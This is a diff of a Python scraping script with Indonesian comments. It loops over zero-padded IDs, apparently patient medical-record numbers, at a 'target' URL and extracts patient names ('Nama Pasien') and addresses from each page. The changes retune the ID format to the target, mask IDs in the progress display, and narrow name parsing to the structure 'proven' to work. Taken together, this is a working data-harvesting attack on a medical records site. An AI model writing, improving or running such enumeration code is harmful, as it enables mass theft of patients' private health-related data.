@@ -85,8 +85,8 @@ def login():
 
 def fetch_data(id_num):
     global total_checked, total_to_scan
-    # Sesuaikan padding menjadi 8 agar sesuai dengan format No RM (00510481)
-    formatted_id = str(id_num).zfill(8)
+    # Sesuaikan padding menjadi 12 agar sesuai dengan format target (Contoh: 000000502013)
+    formatted_id = str(id_num).zfill(12)
     url = BASE_TARGET_URL + formatted_id
     
     try:
@@ -94,8 +94,10 @@ def fetch_data(id_num):
         
         with lock:
             total_checked += 1
-            # Menampilkan progress per ID: [Current/Total]
-            print(f"[*] Scanning ID {formatted_id} ({total_checked}/{total_to_scan})", end='\r')
+            # Menampilkan progress per ID dengan penyamaran (2 depan, 1 tengah, 1 belakang)
+            mid = len(formatted_id) // 2
+            m_id = f"{formatted_id[:2]}****{formatted_id[mid]}****{formatted_id[-1]}"
+            print(f"[*] Scanning ID {m_id} ({total_checked}/{total_to_scan})", end='\r')
 
         # Jika response melambat, beri sedikit jeda
         if res.elapsed.total_seconds() > 2: time.sleep(0.5)
@@ -103,19 +105,15 @@ def fetch_data(id_num):
         if res.status_code != 200: return
 
         soup = BeautifulSoup(res.text, 'html.parser')
+        all_sales = soup.find_all('p', class_='sale-price')
         nama = ""
-        
-        # Logika ekstraksi nama yang lebih fleksibel
-        nama_tag = soup.find('p', class_='text-success') or soup.find('p', class_='sale-price text-success')
-        if nama_tag:
-            nama = nama_tag.get_text(strip=True)
-        else:
-            all_sales = soup.find_all('p', class_='sale-price')
-            for i, p in enumerate(all_sales):
-                txt = p.get_text(strip=True)
-                if "Nama Pasien" in txt and i + 1 < len(all_sales):
-                    nama = all_sales[i+1].get_text(strip=True)
-                    break
+
+        # Logika ekstraksi nama sesuai struktur yang terbukti berhasil (mencari label Nama Pasien)
+        for i, p in enumerate(all_sales):
+            txt = p.get_text(strip=True)
+            if "Nama Pasien" in txt and i + 1 < len(all_sales):
+                nama = all_sales[i+1].get_text(strip=True)
+                break
 
         if nama:
             alamat = "Tidak Ditemukan"
